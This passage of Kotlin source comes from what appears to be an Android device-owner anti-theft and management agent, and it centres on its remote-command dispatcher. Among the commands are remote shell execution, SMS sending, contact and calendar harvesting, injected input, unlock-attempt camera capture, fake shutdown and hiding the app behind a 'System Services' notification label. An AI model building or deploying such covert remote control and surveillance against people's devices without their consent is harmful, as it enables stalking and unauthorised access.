                    } catch (e: Exception) { Log.e(TAG, "wipe_device RecoverySystem failed: ${e.message}") }
                }
            }
            "show_message" -> {
                val msg = cmd.optString("message", "").ifEmpty { return }
                showAlertNotification(msg)
            }
            "deep_sleep"           -> enterDeepSleep()
            "start_theft_mode"     -> enterTheftMode()
            "stop_theft_mode"      -> exitTheftMode()
            "start_fake_shutdown"  -> startFakeShutdown()
            "stop_fake_shutdown"   -> stopFakeShutdown()
            "set_wifi_autojoin"    -> {
                val prefs = Prefs(this)
                prefs.wifiAutoJoinEnabled = cmd.optBoolean("enabled", false)
                prefs.wifiAutoJoinAllow   = (cmd.optJSONArray("allow") ?: org.json.JSONArray()).toString()
                prefs.wifiAutoJoinDeny    = (cmd.optJSONArray("deny")  ?: org.json.JSONArray()).toString()
                prefs.rogueDefenseEnabled = cmd.optBoolean("rogueDefense", false)
                prefs.wifiWatchJson       = (cmd.optJSONObject("watch") ?: org.json.JSONObject()).toString()
                Log.i(TAG, "set_wifi_autojoin enabled=${prefs.wifiAutoJoinEnabled} rogueDefense=${prefs.rogueDefenseEnabled}")
                // Disable denied saved networks immediately so Android's own WiFi manager
                // can't auto-connect to them while the agent waits for the next scan cycle.
                WifiAutoJoinHelper.disableDeniedNetworks(this)
                if (prefs.wifiAutoJoinEnabled) WifiAutoJoinHelper.triggerNow(this)
                else WifiAutoJoinHelper.restore(this)   // re-enable any networks auto-join disabled
            }
            "set_unlock_capture"   -> {
                // What/when to capture on lock-screen unlock attempts (Photos tab). Server-pushed.
                val prefs = Prefs(this)
                prefs.unlockCaptureCamera     = cmd.optBoolean("camera", false)
                prefs.unlockCaptureScreenshot = cmd.optBoolean("screenshot", false)
                prefs.unlockCaptureOnSuccess  = cmd.optBoolean("onSuccess", false)
                Log.i(TAG, "set_unlock_capture camera=${prefs.unlockCaptureCamera} screenshot=${prefs.unlockCaptureScreenshot} onSuccess=${prefs.unlockCaptureOnSuccess}")
            }
            "set_vpn" -> {
                // Auto-VPN on open WiFi. egressUuid is a SERVER SECRET pushed over this encrypted
                // channel — never shipped in the APK — so the node can't be used as an open proxy.
                val prefs = Prefs(this)
                prefs.vpnOnOpenWifiEnabled = cmd.optBoolean("enabled", false)      // auto: open-WiFi only (full)
                prefs.vpnForceEnabled      = cmd.optBoolean("force", false)         // manual WebUI: all networks (full)
                prefs.vpnTailnetOnly       = cmd.optBoolean("tailnetOnly", false)   // split: only tailnet subnets
                prefs.vpnV6Enabled         = cmd.optBoolean("v6", false)            // full tunnel ALSO carries IPv6
                val uuid = cmd.optString("egressUuid", "")
                if (uuid.isNotBlank()) prefs.vpnEgressUuid = uuid      // provision/rotate; keep last on absent
                val active = (prefs.vpnOnOpenWifiEnabled || prefs.vpnForceEnabled || prefs.vpnTailnetOnly) && prefs.vpnEgressUuid.isNotBlank()
                Log.i(TAG, "set_vpn openWifi=${prefs.vpnOnOpenWifiEnabled} force=${prefs.vpnForceEnabled} tailnetOnly=${prefs.vpnTailnetOnly} v6=${prefs.vpnV6Enabled} egress=${if (prefs.vpnEgressUuid.isNotBlank()) "set" else "unset"}")
                DeviceOwnerHelper(this).setSelfAlwaysOnVpn(active)     // arm/clear consent + auto-start
                TransportManager.refresh(this)                        // fold the egress UUID into a running xray
                OpenWifiVpnController.reevaluate(this)                 // start/stop the TUN for the current network
            }
            "set_tailnet" -> {
                // Tailnet access — routes specific subnets (admin-assigned group) through a dedicated
                // REALITY outbound to the Tailscale relay. Server SECRET UUID, never in the APK.
                // Public (ZK-owned) devices NEVER receive this command — server enforces that invariant.
                val prefs   = Prefs(this)
                val enabled = cmd.optBoolean("enabled", false)
                if (enabled) {
                    val uuid = cmd.optString("egressUuid", "")
                    if (uuid.isNotBlank()) prefs.tailnetEgressUuid = uuid
                    val subnetsArr = cmd.optJSONArray("subnets")
                    if (subnetsArr != null) prefs.tailnetSubnets = subnetsArr.toString()
                    prefs.tailnetEnabled = true
                } else {
                    prefs.tailnetEnabled    = false
                    prefs.tailnetEgressUuid = ""
                    prefs.tailnetSubnets    = "[]"
                }
                Log.i(TAG, "set_tailnet enabled=${prefs.tailnetEnabled} subnets=${prefs.tailnetSubnets}")
                TransportManager.refresh(this)         // xray restarts with updated routing rules
                OpenWifiVpnController.reevaluate(this)  // (re)build the split tunnel now that subnets changed
            }
"set_device_restriction" -> {
                val restriction = cmd.optString("restriction")
                val enabled     = cmd.optBoolean("enabled", true)
                DeviceOwnerHelper(this).setRestriction(restriction, enabled)
                // Cellular lockdown toggles the force-re-enable watchdog.
                updateCellularWatchdog()
                sendDeviceStatus()
            }
            "reboot_device" -> DeviceOwnerHelper(this).reboot()
            "lock_app_permissions" -> {
                val failed = DeviceOwnerHelper(this).lockAppPermissions()
                SocketManager.emit("permission_lock_result", org.json.JSONObject().apply {
                    put("success", failed.isEmpty())
                    put("failed",  org.json.JSONArray(failed))
                })
                sendDeviceStatus()
            }
            "update_app" -> {
                val token = cmd.optString("token", "")
                if (token.isNotEmpty()) {
                    val relayUrl = SocketManager.activeRelayUrl().trimEnd('/')
                    val baseUrl = if (SocketManager.isUsingRelay && relayUrl.isNotEmpty()) relayUrl else Prefs.SERVER_URL
                    AppUpdater(this).download("$baseUrl/api/update/apk?token=$token")
                }
            }
            "install_apk" -> {
                val token = cmd.optString("token", "")
                if (token.isNotEmpty()) {
                    val relayUrl = SocketManager.activeRelayUrl().trimEnd('/')
                    val baseUrl = if (SocketManager.isUsingRelay && relayUrl.isNotEmpty()) relayUrl else Prefs.SERVER_URL
                    AppUpdater(this, isSelfUpdate = false).download("$baseUrl/api/install-apk?token=$token")
                }
            }
            // "ota_update" command removed — OS OTA is now handled by the stock GrapheneOS
            // Updater app (repointed to ota.example.com). The agent no longer downloads or
            // installs OS images. Agent APK self-update still uses the "update_app" path below.
            "uninstall_app" -> {
                val pkg = cmd.optString("package", "")
                if (pkg.isNotEmpty() && pkg != packageName) {
                    Thread {
                        try {
                            val intent = android.content.Intent(this, InstallResultReceiver::class.java).apply {
                                putExtra("action", "uninstall")
                                putExtra("package", pkg)
                            }
                            val pending = android.app.PendingIntent.getBroadcast(
                                this, pkg.hashCode(), intent,
                                android.app.PendingIntent.FLAG_MUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
                            )
                            packageManager.packageInstaller.uninstall(pkg, pending.intentSender)
                            Log.i(TAG, "Uninstall requested: $pkg")
                        } catch (e: Exception) {
                            Log.e(TAG, "Uninstall error for $pkg: ${e.message}")
                        }
                    }.start()
                }
            }
            "pull_apk" -> {
                val pkg = cmd.optString("package", "")
                if (pkg.isNotEmpty()) {
                    Thread {
                        val outPath = "$pkg.apk"
                        try {
                            val apkPath = packageManager.getApplicationInfo(pkg, 0).sourceDir
                            Log.d(TAG, "Pulling APK: $pkg → $apkPath")
                            val file = java.io.File(apkPath)
                            if (!file.canRead()) throw Exception("Permission denied")
                            val fileSize = file.length()
                            val maxBytes = 300L * 1024 * 1024  // 300 MB
                            if (fileSize > maxBytes) throw Exception("APK too large (${fileSize / 1_048_576}MB > 300MB)")
                            // Stream in 1 MB chunks — keeps peak heap to ~3 MB regardless of APK size
                            val chunkSize  = 1024 * 1024
                            val totalChunks = ((fileSize + chunkSize - 1) / chunkSize).toInt()
                            val buf = ByteArray(chunkSize)
                            var chunkIndex = 0
                            file.inputStream().use { stream ->
                                var bytesRead: Int
                                while (stream.read(buf).also { bytesRead = it } != -1) {
                                    val slice = if (bytesRead == chunkSize) buf else buf.copyOf(bytesRead)
                                    SocketManager.emit("file_chunk", JSONObject().apply {
                                        put("path",        outPath)
                                        put("name",        "$pkg.apk")
                                        put("chunkIndex",  chunkIndex)
                                        put("totalChunks", totalChunks)
                                        put("fileSize",    fileSize)
                                        put("base64", android.util.Base64.encodeToString(slice, android.util.Base64.NO_WRAP))
                                    })
                                    chunkIndex++
                                }
                            }
                            Log.i(TAG, "pull_apk: sent $chunkIndex chunks for $pkg (${fileSize / 1_048_576}MB)")
                        } catch (e: Throwable) {
                            Log.e(TAG, "pull_apk error for $pkg: ${e.message}")
                            SocketManager.emit("file_data", JSONObject().apply {
                                put("error", e.message ?: "Read failed")
                                put("path",  outPath)
                            })
                        }
                    }.start()
                }
            }
            "set_password" -> {
                val password = cmd.optString("password", "")
                val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, DeviceAdminReceiver::class.java)
                if (dpm.isAdminActive(admin)) {
                    try {
                        val tokenB64 = Prefs(this).resetPasswordToken
                        if (tokenB64.isNotEmpty() && dpm.isResetPasswordTokenActive(admin)) {
                            val token = android.util.Base64.decode(tokenB64, android.util.Base64.NO_WRAP)
                            val ok = dpm.resetPasswordWithToken(admin, password, token, 0)
                            Log.i(TAG, "set_password (token): success=$ok")
                        } else {
                            // Token not active — fall back to legacy API (Device Owner).
                            ensureResetTokenRegistered()
                            @Suppress("DEPRECATION")
                            val ok = dpm.resetPassword(password, 0)
                            Log.i(TAG, "set_password (legacy fallback): success=$ok")
                        }
                    } catch (e: Exception) { Log.e(TAG, "set_password failed: ${e.message}") }
                } else { Log.w(TAG, "set_password: Device Admin not active") }
            }
            "hide_app" -> {
                // Disable AccountLinkActivity (the launcher entry point) — not MainActivity.
                // Disabling MainActivity was crashing AccountLinkActivity.onCreate() which
                // calls startActivity(Intent(ctx, MainActivity::class.java)) on DO devices.
                packageManager.setComponentEnabledSetting(
                    android.content.ComponentName(this, AccountLinkActivity::class.java),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
                )
                Prefs(this).appHidden = true
            }
            "show_app" -> {
                packageManager.setComponentEnabledSetting(
                    android.content.ComponentName(this, AccountLinkActivity::class.java),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
                )
                Prefs(this).appHidden = false
            }
            "connect_wifi" -> {
                val ssid     = cmd.optString("ssid", "")
                val password = cmd.optString("password", "").ifEmpty { null }
                val security = cmd.optString("security", "WPA2")
                if (ssid.isNotEmpty()) {
                    WifiHelper(this).connectToNetwork(ssid, password, security) { result ->
                        SocketManager.emit("wifi_connect_result", result)
                    }
                }
            }
            "captive_portal_submit" -> {
                val url    = cmd.optString("url", "")
                val method = cmd.optString("method", "POST")
                val body   = cmd.optString("body", "")
                if (url.isNotEmpty()) {
                    WifiHelper(this).submitCaptivePortal(url, method, body) { result ->
                        SocketManager.emit("captive_portal_result", result)
                    }
                }
            }
            "bypass_captive_portal" -> {
                // Admin confirms this network has real internet despite the portal flag.
                // Notes:
                //  • captive_portal_mode=0 works on API 26-27 but silently no-ops on Android 9+ —
                //    it's NOT in dpm.setGlobalSetting()'s allowed-keys list (SocketManager comment).
                //  • The effective lever on modern Android is reportNetworkConnectivity(network, true),
                //    which calls NetworkMonitor.forceReevaluation() → the OS re-probes this WiFi and
                //    promotes it to VALIDATED / OS default route (which SocketManager then reclaims).
                DeviceOwnerHelper(this).setGlobalSetting("captive_portal_mode", "0")
                val wifiNet = AirlineWifiHelper.wifiNetwork(this)
                if (wifiNet != null) {
                    AirlineWifiHelper.reportCleared(this, wifiNet)
                    Log.i(TAG, "By-pass: requested WiFi re-evaluation (${AirlineWifiHelper.currentSsid(this)})")
                } else {
                    Log.w(TAG, "bypass_captive_portal: no WiFi network currently to re-evaluate")
                }
                SocketManager.emit("captive_portal_bypassed", JSONObject())
            }
            "set_airline_wifi" -> {
                // Store airline WiFi credentials for auto-login on known airline SSIDs.
                // Server pushes {airlines:{<id>:{enabled,credentials}}} on change + on every reconnect
                // (same pattern as wifi_autojoin). The helper also accepts the legacy single-airline
                // shape {airline,enabled,credentials} and normalizes it internally.
                AirlineWifiHelper.setConfig(cmd)
                val airlines = cmd.optJSONObject("airlines")
                Log.i(TAG, "Airline WiFi config set: ${airlines?.length() ?: cmd.optString("airline", "0")} airline(s)")
            }
            "test_airline_login" -> {
                // Test airline WiFi credentials if device is currently on a known airline SSID.
                Thread {
                    val ssid = AirlineWifiHelper.currentSsid(this)
                    val airlineId = AirlineWifiHelper.detectAirline(ssid)
                    val result = JSONObject()
                    result.put("ssid", ssid ?: "")
                    result.put("airline", airlineId ?: "")
                    val wifiNet = AirlineWifiHelper.wifiNetwork(this)
                    if (wifiNet != null && AirlineWifiHelper.shouldAutoJoin(ssid)) {
                        val ok = AirlineWifiHelper.trySolve(this, wifiNet, AirlineWifiHelper.gatewayIp(this), ssid)
                        if (ok) AirlineWifiHelper.reportCleared(this, wifiNet)
                        result.put("success", ok)
                        result.put("message", if (ok) "Login succeeded"
                            else "Login not confirmed — check credentials or sign in manually (portal may not support auto-login)")
                    } else if (airlineId == null && !AirlineWifiHelper.isInflightVendorSsid(ssid)) {
                        result.put("success", false)
                        result.put("message", "Not on airline WiFi — credentials saved for next flight")
                    } else {
                        result.put("success", false)
                        result.put("message", "No credentials configured for this airline")
                    }
                    SocketManager.emit("airline_login_test_result", result)
                }.start()
            }
            "collect_logs" -> {
                val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, DeviceAdminReceiver::class.java)
                if (dpm.isDeviceOwnerApp(packageName)) {
                    try {
                        // Toggle forces immediate delivery of any buffered security log events.
                        // Network logs cannot be force-flushed — they deliver automatically at ~1200 events.
                        if (dpm.isSecurityLoggingEnabled(admin)) {
                            dpm.setSecurityLoggingEnabled(admin, false)
                            dpm.setSecurityLoggingEnabled(admin, true)
                        }
                    } catch (e: Exception) { Log.w(TAG, "collect_logs: ${e.message}") }
                }
            }
            "get_app_permissions" -> {
                val pkg = cmd.optString("package", "")
                if (pkg.isNotEmpty()) {
                    val doh = DeviceOwnerHelper(this)
                    SocketManager.emit("app_permissions_result", JSONObject().apply {
                        put("package", pkg)
                        put("permissions", doh.getAppPermissions(pkg))
                        put("suspended", doh.isAppSuspended(pkg))
                    })
                }
            }
            "set_app_permission" -> {
                val pkg        = cmd.optString("package", "")
                val permission = cmd.optString("permission", "")
                val state      = cmd.optString("state", "default")
                if (pkg.isNotEmpty() && permission.isNotEmpty()) {
                    val doh = DeviceOwnerHelper(this)
                    doh.setAppPermission(pkg, permission, state)
                    SocketManager.emit("app_permissions_result", JSONObject().apply {
                        put("package", pkg)
                        put("permissions", doh.getAppPermissions(pkg))
                        put("suspended", doh.isAppSuspended(pkg))
                    })
                }
            }
            "suspend_app" -> {
                val pkg       = cmd.optString("package", "")
                val suspended = cmd.optBoolean("suspended", true)
                if (pkg.isNotEmpty() && pkg != packageName) {
                    val doh = DeviceOwnerHelper(this)
                    doh.setAppSuspended(pkg, suspended)
                    SocketManager.emit("app_permissions_result", JSONObject().apply {
                        put("package", pkg)
                        put("permissions", doh.getAppPermissions(pkg))
                        put("suspended", doh.isAppSuspended(pkg))
                    })
                }
            }
            "get_integrity_status" -> {
                // Force a fresh attestation regardless of the TTL cache
                runAttestationAsync(forceEmit = true)
            }
            "clear_app_data" -> {
                val pkg = cmd.optString("package", "")
                if (pkg.isNotEmpty() && pkg != packageName) {
                    DeviceOwnerHelper(this).clearAppData(pkg) { success ->
                        SocketManager.emit("clear_app_data_result", JSONObject().apply {
                            put("package", pkg)
                            put("success", success)
                        })
                    }
                }
            }
            "get_install_filter" -> {
                val doh = DeviceOwnerHelper(this)
                SocketManager.emit("install_filter_result", JSONObject().apply {
                    put("mode", doh.getInstallFilterMode())
                    put("list", org.json.JSONArray(doh.getInstallFilterList()))
                })
            }
            "set_install_filter_mode" -> {
                val mode = cmd.optString("mode", "blacklist")
                DeviceOwnerHelper(this).setInstallFilterMode(mode)
                val doh = DeviceOwnerHelper(this)
                SocketManager.emit("install_filter_result", JSONObject().apply {
                    put("mode", doh.getInstallFilterMode())
                    put("list", org.json.JSONArray(doh.getInstallFilterList()))
                })
            }
            "add_install_filter" -> {
                val pkg = cmd.optString("package", "").ifEmpty { return }
                val doh = DeviceOwnerHelper(this)
                doh.addInstallFilterEntry(pkg)
                SocketManager.emit("install_filter_result", JSONObject().apply {
                    put("mode", doh.getInstallFilterMode())
                    put("list", org.json.JSONArray(doh.getInstallFilterList()))
                })
            }
            "remove_install_filter" -> {
                val pkg = cmd.optString("package", "").ifEmpty { return }
                val doh = DeviceOwnerHelper(this)
                doh.removeInstallFilterEntry(pkg)
                SocketManager.emit("install_filter_result", JSONObject().apply {
                    put("mode", doh.getInstallFilterMode())
                    put("list", org.json.JSONArray(doh.getInstallFilterList()))
                })
            }
            "get_uninstall_blocked" -> {
                val doh = DeviceOwnerHelper(this)
                SocketManager.emit("uninstall_blocked_result", JSONObject().apply {
                    put("list", org.json.JSONArray(doh.getUninstallBlockedPackages()))
                })
            }
            "set_uninstall_blocked" -> {
                val pkg     = cmd.optString("package", "").ifEmpty { return }
                val blocked = cmd.optBoolean("blocked", true)
                if (pkg == packageName) return
                val doh = DeviceOwnerHelper(this)
                doh.setUninstallBlocked(pkg, blocked)
                SocketManager.emit("uninstall_blocked_result", JSONObject().apply {
                    put("package", pkg)
                    put("blocked", blocked)
                    put("list", org.json.JSONArray(doh.getUninstallBlockedPackages()))
                })
            }
            "get_contacts" -> Thread {
                val contacts = ContactsHelper(this).getContacts()
                SocketManager.emit("contacts_data", JSONObject().apply { put("contacts", contacts) })
            }.start()
            "get_calendar" -> Thread {
                val events = ContactsHelper(this).getCalendarEvents()
                SocketManager.emit("calendar_data", JSONObject().apply { put("events", events) })
            }.start()
            "get_usage_stats" -> Thread {
                try {
                    val usm = getSystemService(android.app.usage.UsageStatsManager::class.java)
                    val end   = System.currentTimeMillis()
                    val start = end - 7L * 24 * 60 * 60 * 1000
                    val stats = usm.queryUsageStats(
                        android.app.usage.UsageStatsManager.INTERVAL_DAILY, start, end
                    )
                    val arr = JSONArray()
                    stats?.sortedByDescending { it.totalTimeInForeground }?.forEach { s ->
                        if (s.totalTimeInForeground > 0) {
                            arr.put(JSONObject().apply {
                                put("pkg",       s.packageName)
                                put("totalMs",   s.totalTimeInForeground)
                                put("lastUsed",  s.lastTimeUsed)
                            })
                        }
                    }
                    SocketManager.emit("usage_stats_data", JSONObject().apply { put("stats", arr) })
                } catch (e: Exception) {
                    Log.e(TAG, "get_usage_stats: ${e.message}")
                }
            }.start()
            "shell_exec" -> {
                val command   = cmd.optString("cmd", "").ifEmpty { return }
                val sessionId = cmd.optString("sessionId", System.currentTimeMillis().toString())
                shellHelper.exec(command, sessionId) { chunk ->
                    SocketManager.emit("shell_output", chunk)
                }
            }
            "shell_stop" -> shellHelper.stop()
            "start_logcat" -> {
                if (!logcatHelper.streaming) {
                    logcatHelper.start { line ->
                        SocketManager.emit("logcat_line", line)
                    }
                }
            }
            "stop_logcat" -> logcatHelper.stop()
            "inject_tap" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val x = cmd.optDouble("x", 0.0).toFloat()
                    val y = cmd.optDouble("y", 0.0).toFloat()
                    ScreenshotService.instance?.injectTap(x, y)
                }
            }
            "inject_swipe" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val x1 = cmd.optDouble("x1", 0.0).toFloat()
                    val y1 = cmd.optDouble("y1", 0.0).toFloat()
                    val x2 = cmd.optDouble("x2", 0.0).toFloat()
                    val y2 = cmd.optDouble("y2", 0.0).toFloat()
                    val ms = cmd.optLong("duration", 300L)
                    ScreenshotService.instance?.injectSwipe(x1, y1, x2, y2, ms)
                }
            }
            "inject_long_press" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val x = cmd.optDouble("x", 0.0).toFloat()
                    val y = cmd.optDouble("y", 0.0).toFloat()
                    ScreenshotService.instance?.injectLongPress(x, y)
                }
            }
            "inject_text" -> {
                val text = cmd.optString("text", "")
                ScreenshotService.instance?.injectText(text)
            }
            "inject_key" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val keyCode = cmd.optInt("keyCode", -1)
                    if (keyCode >= 0) ScreenshotService.instance?.injectKey(keyCode)
                }
            }
            "send_sms" -> {
                val number  = cmd.optString("number", "").ifEmpty { return }
                val message = cmd.optString("message", "").ifEmpty { return }
                Thread {
                    try {
                        @Suppress("DEPRECATION")
                        val sms = SmsManager.getDefault()
                        val parts = sms.divideMessage(message)
                        sms.sendMultipartTextMessage(number, null, parts, null, null)
                        SocketManager.emit("sms_sent", JSONObject().apply {
                            put("number",  number)
                            put("message", message)
                            put("ts",      System.currentTimeMillis())
                        })
                        Log.i(TAG, "SMS sent to $number")
                    } catch (e: Exception) {
                        Log.e(TAG, "send_sms error: ${e.message}")
                        SocketManager.emit("sms_sent", JSONObject().apply {
                            put("error", e.message)
                            put("number", number)
                        })
                    }
                }.start()
            }
            "set_watched_apps" -> {
                val arr = cmd.optJSONArray("packages") ?: return
                synchronized(ScreenshotService.watchedApps) {
                    ScreenshotService.watchedApps.clear()
                    for (i in 0 until arr.length()) {
                        ScreenshotService.watchedApps.add(arr.getString(i))
                    }
                }
            }
            "add_geofence" -> {
                val id          = cmd.optString("id", "").ifEmpty { return }
                val lat         = cmd.optDouble("lat", Double.NaN).takeIf { !it.isNaN() } ?: return
                val lng         = cmd.optDouble("lng", Double.NaN).takeIf { !it.isNaN() } ?: return
                val radius      = cmd.optDouble("radius", 200.0).toFloat().coerceIn(50f, 100_000f)
                val name        = cmd.optString("name", id)
                val transitions = cmd.optInt("transitions",
                    com.google.android.gms.location.Geofence.GEOFENCE_TRANSITION_ENTER or
                    com.google.android.gms.location.Geofence.GEOFENCE_TRANSITION_EXIT)
                val entry = GeofenceManager.Entry(id, name, lat, lng, radius, transitions)
                if (usingGmsGeofences) {
                    geofenceManager.add(entry)
                } else {
                    // start() is idempotent — covers the edge where monitoring couldn't
                    // start at boot (permission not yet granted) but the first fence
                    // arrives later via this command.
                    aospGeofenceManager.start()
                    aospGeofenceManager.add(entry)
                }
                SocketManager.emit("geofence_list", buildGeofenceList())
            }
            "remove_geofence" -> {
                val id = cmd.optString("id", "").ifEmpty { return }
                if (usingGmsGeofences) {
                    geofenceManager.remove(id)
                } else {
                    aospGeofenceManager.remove(id)
                }
                SocketManager.emit("geofence_list", buildGeofenceList())
            }
            "clear_geofences" -> {
                if (usingGmsGeofences) {
                    geofenceManager.clearAll()
                } else {
                    aospGeofenceManager.clearAll()
                }
                SocketManager.emit("geofence_list", JSONObject().apply { put("geofences", org.json.JSONArray()) })
            }
            "get_geofences" -> {
                SocketManager.emit("geofence_list", buildGeofenceList())
            }

            // ── Bluetooth scanner ──────────────────────────────────────────────
            "start_bt_scan" -> {
                // Persist "keep scanning across reboots/restarts" — auto-resumed by the
                // service on start (see resumeBtScanIfEnabled).
                Prefs(this).btScanEnabled = true
                val h = btScanHelper ?: createBtScanHelper().also { btScanHelper = it }
                h.startContinuousScan()
                Log.i(TAG, "BT continuous scan started")
            }
            "stop_bt_scan" -> {
                Prefs(this).btScanEnabled = false
                btScanHelper?.stopScanning()
                btScanHelper = null
                emitBtScanState(false)   // ensure OFF is reported even if helper was null
                Log.i(TAG, "BT scan stopped")
            }
            "scan_bt_once" -> {
                // One-shot: NOT persisted — it must not auto-resume after a restart.
                val h = btScanHelper ?: createBtScanHelper().also { btScanHelper = it }
                h.scanOnce()
                Log.i(TAG, "BT single scan started")
            }

        }
    }

    /**
     * Build a fully-wired BluetoothScanHelper (state callback + scan-result relay). Shared by
     * the start/one-shot command handlers and the post-restart auto-resume path.
     */
    private fun createBtScanHelper(): BluetoothScanHelper = BluetoothScanHelper(this).also {
        it.onScanStateChanged = { scanning -> emitBtScanState(scanning) }
        it.callback = object : BluetoothScanHelper.Callback {
            override fun onScanComplete(devices: org.json.JSONArray, trackers: org.json.JSONArray) {
                // Emit the full device list as a private event
                val payload = JSONObject().apply {
                    put("devices", devices)
                    put("count", devices.length())
                    put("trackerCount", trackers.length())
                    put("timestamp", System.currentTimeMillis())
                }
                SocketManager.emit("bt_device_event", payload)

                // Emit tracker detections as a separate event (triggers alerts)
                if (trackers.length() > 0) {
                    val trackerPayload = JSONObject().apply {
                        put("trackers", trackers)
                        put("count", trackers.length())
                        put("timestamp", System.currentTimeMillis())
                    }
                    SocketManager.emit("tracker_detection", trackerPayload)
                }
            }
        }
    }

    /**
     * Auto-resume the continuous BT scan after a device reboot or agent restart when the
     * operator had it enabled (Prefs.btScanEnabled). Retries briefly with a backoff because
     * Bluetooth permissions may not be granted yet right after boot (DPM pinning / AppOps run
     * asynchronously). One-shot scans are intentionally NOT resumed.
     */
    private fun resumeBtScanIfEnabled(attemptsLeft: Int = 5) {
        if (!Prefs(this).btScanEnabled) return
        val h = btScanHelper ?: createBtScanHelper().also { btScanHelper = it }
        if (h.isActive()) return
        if (!h.hasScanPermissions()) {
            if (attemptsLeft > 0) {
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    resumeBtScanIfEnabled(attemptsLeft - 1)
                }, 2_000)
            } else {
                Log.w(TAG, "BT scan resume skipped — Bluetooth permissions not granted after 10s")
            }
            return
        }
        h.startContinuousScan()
        Log.i(TAG, "BT continuous scan resumed after restart (persisted setting)")
    }

    /** Relay the device's current BT-scan state (ON/OFF) to the server. */
    private fun emitBtScanState(scanning: Boolean) {
        try {
            SocketManager.emit("bt_scan_state", JSONObject().apply { put("scanning", scanning) })
        } catch (e: Exception) { Log.e(TAG, "emitBtScanState error: ${e.message}") }
    }

    private fun buildGeofenceList(): JSONObject {
        val arr = org.json.JSONArray()
        val entries = if (usingGmsGeofences) geofenceManager.getAll() else aospGeofenceManager.getAll()
        entries.forEach { arr.put(it.toJson()) }
        return JSONObject().apply { put("geofences", arr) }
    }

    /**
     * Initialize geofencing — AOSP engine ONLY.
     *
     * ⚠️ History (found live 2026-08, Pixel 10a GOS "stallion", v2.9.0.18): GMS-first with
     * fallback failed TWICE in the field. v2.9.0.17: reloadAll()'s async Task listener made
     * the catch-block dead code, so hasPlayServices()==true (sandboxed GMS resolves) locked
     * us to a provider that accepts registrations and never delivers transitions. v2.9.0.18
     * added GrapheneOS detection — but isGrapheneOs() is UNRELIABLE (hidden-API
     * SystemProperties reflection may be blocked for platform-signed installs not baked into
     * the image, and GOS ships stock-shaped Google fingerprints so the string fallback never
     * matches), and sandboxed GMS reports SUCCESS on addGeofences while silently delivering
     * nothing — there is no probeable difference between working and dead GMS.
     *
     * Decision: standardize on the AOSP LocationManager engine for every device. It rides
     * the always-on location pipeline this service already maintains for tracking (passive
     * provider picks up those fixes for free), shares the identical Prefs store, and its
     * failure modes are observable in logcat. Verified equivalent on stock devices.
     */
    private fun initGeofencing() {
        ensureNetworkLocationEnabled()   // GOS: unlocks NETWORK/FUSED providers for indoor fixes
        usingGmsGeofences = false
        aospGeofenceManager.start()
        aospGeofenceManager.reloadAll()
        Log.i(TAG, "Geofencing: AOSP LocationManager engine (${aospGeofenceManager.getAll().size} fences)")
    }

    private fun showGeofenceNotification(name: String, transition: String) {
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(CHANNEL_ID) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(CHANNEL_ID, "System Services",
                        NotificationManager.IMPORTANCE_LOW)
                )
            }
            val verb = when (transition) {
                "enter" -> "entered"
                "exit"  -> "left"
                "dwell" -> "is dwelling in"
                else    -> transition
            }
            nm.notify(
                2000 + (name.hashCode() and 0x3FF),
                Notification.Builder(this, CHANNEL_ID)
                    .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                    .setContentTitle("Geofence Alert")
                    .setContentText("Device $verb: $name")
                    .setAutoCancel(true)
                    .build()
            )
        } catch (e: Exception) {
            Log.w(TAG, "Geofence notification failed: ${e.message}")
        }
    }

    private fun batteryInfo(): JSONObject {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level   = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val intent  = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status  = intent?.getIntExtra(BatteryManager.EXTRA_STATUS,  -1) ?: -1
        val plugged = intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
        return JSONObject().apply {
            put("level",    level)
            put("charging", status == BatteryManager.BATTERY_STATUS_CHARGING ||
                            status == BatteryManager.BATTERY_STATUS_FULL)
            put("status", when (status) {
                BatteryManager.BATTERY_STATUS_CHARGING     -> "charging"
                BatteryManager.BATTERY_STATUS_DISCHARGING  -> "discharging"
                BatteryManager.BATTERY_STATUS_FULL         -> "full"
                BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "not_charging"
                else -> "unknown"
            })
            put("plugType", when (plugged) {
                BatteryManager.BATTERY_PLUGGED_AC       -> "ac"
                BatteryManager.BATTERY_PLUGGED_USB      -> "usb"
                BatteryManager.BATTERY_PLUGGED_WIRELESS -> "wireless"
                else -> "none"
            })
        }
    }

    private fun storageInfo(): JSONObject {
        val stat = android.os.StatFs(Environment.getDataDirectory().absolutePath)
        return JSONObject().apply {
            put("total", stat.totalBytes)
            put("free",  stat.availableBytes)
            put("used",  stat.totalBytes - stat.availableBytes)
        }
    }

    private fun memoryInfo(): JSONObject {
        val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val mi = android.app.ActivityManager.MemoryInfo()
        am.getMemoryInfo(mi)
        return JSONObject().apply {
            put("total",     mi.totalMem)
            put("available", mi.availMem)
            put("lowMemory", mi.lowMemory)
        }
    }

    /**
     * Writes com.android.systemservices/.NotificationService into the
     * enabled_notification_listeners secure-settings key, then triggers a rebind so
     * the system picks up the change immediately (without requiring a reboot).
     *
     * Requires WRITE_SECURE_SETTINGS (signature|privileged) — in privapp-permissions-sentinel.xml.
     */
